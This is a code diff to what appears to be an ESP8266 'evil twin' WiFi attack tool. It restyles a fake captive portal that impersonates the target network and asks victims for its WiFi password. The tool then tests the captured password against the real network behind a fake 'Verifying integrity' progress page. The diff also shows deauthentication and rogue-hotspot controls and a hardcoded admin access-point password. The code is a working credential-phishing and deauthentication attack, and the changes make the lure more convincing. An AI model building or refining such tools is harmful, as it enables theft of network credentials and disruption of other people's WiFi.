@@ -43,33 +43,119 @@ String _tryPassword = "";
 
 String header(String t) {
   String a = String(_selectedNetwork.ssid);
-  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
-               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
-               "div { padding: 0.5em; }"
-               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw;}"
-               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; border-radius: 10px; }"
-               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
-               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
-               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
-               "textarea { width: 100%; }"
-               ;
+
+  // Modern CSS styles for the page
+  String CSS = R"(
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      background-color: #f9f9f9;
+      font-family: 'Arial', sans-serif;
+      color: #333;
+      line-height: 1.6;
+    }
+    nav {
+      background-color: #007bff;
+      color: #fff;
+      padding: 20px;
+      text-align: center;
+    }
+    nav b {
+      font-size: 1.8em;
+      font-weight: bold;
+      display: block;
+      margin-bottom: 5px;
+    }
+    article {
+      padding: 1.5em;
+      background: #ffffff;
+      border-radius: 8px;
+      box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.1);
+    }
+    h1 {
+      font-size: 3em;
+      color: #333;
+      margin-bottom: 0.5em;
+      text-align: center;
+    }
+    label {
+      display: block;
+      font-size: 1.1em;
+      color: #555;
+      margin-bottom: 8px;
+      font-weight: bold;
+    }
+    input[type='password'], input[type='submit'] {
+      width: 100%;
+      padding: 15px;
+      margin: 10px 0;
+      border: 2px solid #ddd;
+      border-radius: 5px;
+      font-size: 1.1em;
+      outline: none;
+    }
+    input[type='password']:focus, input[type='submit']:focus {
+      border-color: #007bff;
+      box-shadow: 0 0 10px rgba(0, 123, 255, 0.3);
+    }
+    input[type='submit'] {
+      background-color: #007bff;
+      color: white;
+      cursor: pointer;
+      transition: background-color 0.3s;
+    }
+    input[type='submit']:hover {
+      background-color: #0056b3;
+    }
+    .footer {
+      background-color: #f1f1f1;
+      text-align: center;
+      padding: 10px;
+      font-size: 0.9em;
+      color: #666;
+      margin-top: 20px;
+    }
+    .q {
+      margin-top: 20px;
+    }
+    .q a {
+      color: #007bff;
+      text-decoration: none;
+    }
+    .q a:hover {
+      text-decoration: underline;
+    }
+  )";
+
+  // Generate the header HTML
   String h = "<!DOCTYPE html><html>"
              "<head><title><center>" + a + " :: " + t + "</center></title>"
-             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
+             "<meta name='viewport' content='width=device-width,initial-scale=1'>"
              "<style>" + CSS + "</style>"
-             "<meta charset=\"UTF-8\"></head>"
-             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
+             "<meta charset='UTF-8'></head>"
+             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav>"
+             "<article><h1>" + t + "</h1>";
+ 
   return h;
 }
 
 String footer() {
-  return "</div><div class=q><a>&#169; All rights reserved.</a></div>";
+  return "</article><div class='footer'><a>&#169; All rights reserved.</a></div>";
 }
 
 String index() {
-  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action='/' method=post><label>WiFi password:</label>" +
-         "<input type=password id='password' name='password' minlength='8'></input><input type=submit value=Continue></form>" + footer();
+  return header(TITLE) +
+         "<div>" + BODY + "</div>" +
+         "<form action='/' method='post'>"
+         "<label for='password'>WiFi password:</label>"
+         "<input type='password' id='password' name='password' minlength='8' required>"
+         "<input type='submit' value='Continue'></form>" + footer();
 }
+
+
 
 void setup() {
 
@@ -130,13 +216,35 @@ void handleResult() {
 
 
 String _tempHTML = "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
-                   "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
+                   "<style> "
+                   "body { font-family: Arial, sans-serif; background-color: #f4f4f9; margin: 0; padding: 0; color: #333; transition: all 0.3s ease; }"
+                   ".content { max-width: 700px; margin: auto; padding: 20px; background-color: #fff; border-radius: 10px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); }"
+                   "h1 { font-size: 2em; color: #333; margin-bottom: 20px; text-align: center; }"
+                   "table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }"
+                   "th, td { padding: 12px; text-align: left; border-bottom: 1px solid #ddd; transition: background-color 0.3s ease; }"
+                   "th { background-color: #4CAF50; color: white; font-weight: bold; }"
+                   "td { background-color: #f9f9f9; }"
+                   "tr:hover { background-color: #f1f1f1; transform: scale(1.02); transition: transform 0.3s ease; }"
+                   "button { background-color: #4CAF50; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-size: 1em; transition: transform 0.2s ease, background-color 0.3s ease; }"
+                   "button:hover { transform: scale(1.05); background-color: #45a049; }"
+                   "button:active { transform: scale(0.98); background-color: #388e3c; }"
+                   "button:disabled { background-color: #ccc; cursor: not-allowed; }"
+                   "form { display: inline-block; margin: 0 10px 10px 0; }"
+                   "nav { background-color: #0066cc; color: white; padding: 10px 20px; text-align: center; border-radius: 10px 10px 0 0; margin-bottom: 20px; transition: background-color 0.3s ease; }"
+                   "nav:hover { background-color: #004b8d; }"
+                   "nav b { font-size: 1.5em; display: block; }"
+                   "</style>"
                    "</head><body><div class='content'>"
+                   "<nav><b>Network Management</b></nav>"
+                   "<h1>Select a Network and Manage Actions</h1>"
                    "<div><form style='display:inline-block;' method='post' action='/?deauth={deauth}'>"
-                   "<button style='display:inline-block;'{disabled}>{deauth_button}</button></form>"
-                   "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
-                   "<button style='display:inline-block;'{disabled}>{hotspot_button}</button></form>"
-                   "</div></br><table><tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";
+                   "<button {disabled}>{deauth_button}</button></form>"
+                   "<form style='display:inline-block;' method='post' action='/?hotspot={hotspot}'>"
+                   "<button {disabled}>{hotspot_button}</button></form>"
+                   "</div><br><table>"
+                   "<tr><th>SSID</th><th>BSSID</th><th>Channel</th><th>Select</th></tr>";
+
+
 
 void handleIndex() {
 
@@ -237,7 +345,80 @@ void handleIndex() {
       delay(1000);
       WiFi.disconnect();
       WiFi.begin(_selectedNetwork.ssid.c_str(), webServer.arg("password").c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
-      webServer.send(200, "text/html", "<!DOCTYPE html> <html><script> setTimeout(function(){window.location.href = '/result';}, 15000); </script></head><body><center><h2 style='font-size:7vw'>Verifying integrity, please wait...<br><progress value='10' max='100'>10%</progress></h2></center></body> </html>");
+      webServer.send(200, "text/html",
+"<!DOCTYPE html>"
+"<html>"
+"<head>"
+"<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+"<style>"
+"body {"
+"    font-family: Arial, sans-serif;"
+"    background-color: #f4f4f9;"
+"    margin: 0;"
+"    padding: 0;"
+"    display: flex;"
+"    justify-content: center;"
+"    align-items: center;"
+"    height: 100vh;"
+"    text-align: center;"
+"}"
+"h2 {"
+"    font-size: 7vw;"
+"    color: #333;"
+"    animation: fadeIn 2s ease-out;"
+"}"
+"progress {"
+"    width: 80%;"
+"    height: 20px;"
+"    border-radius: 10px;"
+"    appearance: none;"
+"    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);"
+"    margin-top: 20px;"
+"    transition: all 0.3s ease;"
+"}"
+"progress::-webkit-progress-bar {"
+"    background-color: #eee;"
+"    border-radius: 10px;"
+"}"
+"progress::-webkit-progress-value {"
+"    background-color: #4CAF50;"
+"    border-radius: 10px;"
+"}"
+"progress::-moz-progress-bar {"
+"    background-color: #4CAF50;"
+"    border-radius: 10px;"
+"}"
+"@keyframes fadeIn {"
+"    from {"
+"        opacity: 0;"
+"    }"
+"    to {"
+"        opacity: 1;"
+"    }"
+"}"
+"</style>"
+"<script>"
+"let progress = document.querySelector('progress');"
+"let value = 10;"
+"setInterval(function() {"
+"    if (value < 100) {"
+"        value += 10;"
+"        progress.value = value;"
+"    }"
+"}, 1500);"
+"setTimeout(function() {"
+"    window.location.href = '/result';"
+"}, 15000);"
+"</script>"
+"</head>"
+"<body>"
+"<div>"
+"<h2>Verifying integrity, please wait...</h2>"
+"<progress value='10' max='100'>10%</progress>"
+"</div>"
+"</body>"
+"</html>");
+
       if (webServer.arg("deauth") == "start") {
       deauthing_active = true;
       }
@@ -285,7 +466,7 @@ void handleAdmin() {
       int n = WiFi.softAPdisconnect (true);
       Serial.println(String(n));
       WiFi.softAPConfig(IPAddress(192, 168, 4, 1) , IPAddress(192, 168, 4, 1) , IPAddress(255, 255, 255, 0));
-      WiFi.softAP("BOOMER", "d347h320");
+      WiFi.softAP("BOOMER", "99887766");
       dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
     }
     return;
